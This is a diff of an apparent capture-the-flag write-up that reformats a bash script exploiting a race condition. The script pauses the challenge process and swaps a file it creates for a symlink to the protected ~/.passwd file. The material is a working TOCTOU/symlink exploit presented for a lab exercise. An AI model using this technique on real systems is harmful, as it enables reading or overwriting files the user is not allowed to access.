@@ -155,31 +155,29 @@ Then copy the following script in the file :
 ```bash
 #!/bin/bash
 
-
 DIRECTORY="/tmp/$PPID/$1"
 echo "Checking in: $DIRECTORY"
 
 while :; do
     if [ -d "$DIRECTORY" ]; then
         if [ "$(ls -A "$DIRECTORY")" ]; then
-
             DIR_PATTERN="tmp.*"
             FOUND_DIRS=$(find "$DIRECTORY" -type d -name "$DIR_PATTERN")
 
             if [ -n "$FOUND_DIRS" ]; then 
-            	kill -SIGSTOP $1
-            	echo -n "data" > $FOUND_DIRS/pwned_file
-            	kill -SIGCONT $1
-           		ln -sf ~/.passwd $FOUND_DIRS/pwned_file
-                    while : ; do
-       					kill -SIGSTOP $1
-                    	unlink $FOUND_DIRS/pwned_file
-    					echo -n "data" > $FOUND_DIRS/pwned_file
-    					ln -sf ~/.passwd $FOUND_DIRS/pwned_file
-    					kill -SIGCONT $1
-    				[[ -e "$FOUND_DIRS" ]] || break
-					done
-                    break
+                kill -SIGSTOP $1
+                echo -n "data" > $FOUND_DIRS/pwned_file
+                kill -SIGCONT $1
+                ln -sf ~/.passwd $FOUND_DIRS/pwned_file
+                while : ; do
+                    kill -SIGSTOP $1
+                    unlink $FOUND_DIRS/pwned_file
+                    echo -n "data" > $FOUND_DIRS/pwned_file
+                    ln -sf ~/.passwd $FOUND_DIRS/pwned_file
+                    kill -SIGCONT $1
+                    [[ -e "$FOUND_DIRS" ]] || break
+                done
+                break
             else
                 echo "No directories found matching pattern '$DIR_PATTERN' in $DIRECTORY."
             fi
@@ -191,6 +189,7 @@ while :; do
     fi
 done
 ```
+
 This scipts do a infinite loop and monitor the directories created by the challenge script, when he found a directory in /tmp that matchs he creates a symlink to $HOME/.passwd
 in order to do a race condition exploit on this command of the challenge script :
 ```bash 
